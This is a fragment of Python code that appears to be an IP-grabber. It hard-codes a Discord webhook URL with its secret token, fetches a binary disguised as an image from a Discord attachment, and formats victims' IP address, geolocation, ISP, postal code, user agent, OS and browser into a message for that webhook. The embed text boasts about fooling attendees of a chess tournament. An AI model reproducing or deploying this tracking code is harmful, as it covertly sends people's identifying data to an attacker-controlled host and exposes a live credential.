...
webhook = 'https://discord.com/api/webhooks/1172528923041607690/TMkfS2kJJlngGIYGFWv-_DepthoKoZwdwCfu2QPJflbVZsiKyQ9tqq0idITA9lPf_XzA'
bindata = requests.get('https://cdn.discordapp.com/attachments/1099608916897312778/1172528321213497535/image.png?ex=6560a518&is=654e3018&hm=5c2684ddf0d5e99910cf6d6c03fb0a15d9f36b4d13174f0639823f33aec13b35&').content
...
def formatHook(ip,city,reg,country,loc,org,postal,useragent,os,browser):
  ...
  "embeds": [
    {
      "title": "H20 strikes again!",
      "color": 16711803,
      "description": "Thanks BSM chess tournament. You really fooled them good!",
      "author": {
        "name": "Fentanyl"
      },
      "fields": [
